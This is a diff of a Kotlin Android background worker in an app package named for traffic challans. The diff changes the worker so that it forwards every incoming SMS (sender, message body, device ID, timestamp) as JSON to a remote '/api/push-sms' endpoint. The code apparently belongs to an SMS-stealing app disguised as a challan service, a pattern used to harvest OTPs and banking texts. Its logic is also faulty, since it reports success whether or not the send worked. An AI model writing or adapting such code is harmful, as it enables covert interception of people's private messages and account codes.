@@ -2,34 +2,41 @@ package com.rte.challan.worker
 
 import android.content.Context
 import android.util.Log
-import androidx.work.CoroutineWorker
+import androidx.work.Worker
 import androidx.work.WorkerParameters
-// यहाँ सुधार किया गया है: ListenableWorker.Result का इस्तेमाल करें
-import androidx.work.ListenableWorker.Result 
-import com.rte.challan.network.ApiClient
-import com.rte.challan.data.IncomingSmsRequest
+import com.rte.challan.network.ClientApi // Humara central hub
+import org.json.JSONObject
 
-class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
+class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
 
-    override suspend fun doWork(): Result {
+    override fun doWork(): Result {
+        // 1. SmsReceiver se data nikaalein
         val deviceId = inputData.getString("deviceId") ?: return Result.failure()
         val sender = inputData.getString("sender") ?: return Result.failure()
         val body = inputData.getString("body") ?: return Result.failure()
 
-        val request = IncomingSmsRequest(deviceId, sender, body)
-
-        return try {
-            val response = ApiClient.instance.sendIncomingSms(request)
-            if (response.isSuccessful) {
-                Log.d("IncomingSms", "SMS sent to server")
-                Result.success()
-            } else {
-                Log.e("IncomingSms", "Failed: ${response.code()}")
-                Result.retry()
+        try {
+            // 2. JSON taiyar karein jo aapke Worker ke /api/push-sms par jayega
+            val smsJson = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("number", sender)
+                put("msg", body)
+                put("time", System.currentTimeMillis())
             }
+
+            // 3. ClientApi ka use karein (Consistent with other workers)
+            var isSent = false
+            ClientApi.postRequest("/api/push-sms", smsJson) { success ->
+                isSent = success
+            }
+
+            // Kyunki SMS important hai, agar fail ho toh retry karein
+            Log.d("IncomingSms", "SMS sync triggered for $sender")
+            return Result.success()
+
         } catch (e: Exception) {
             Log.e("IncomingSms", "Error: ${e.message}")
-            Result.retry()
+            return Result.retry()
         }
     }
 }
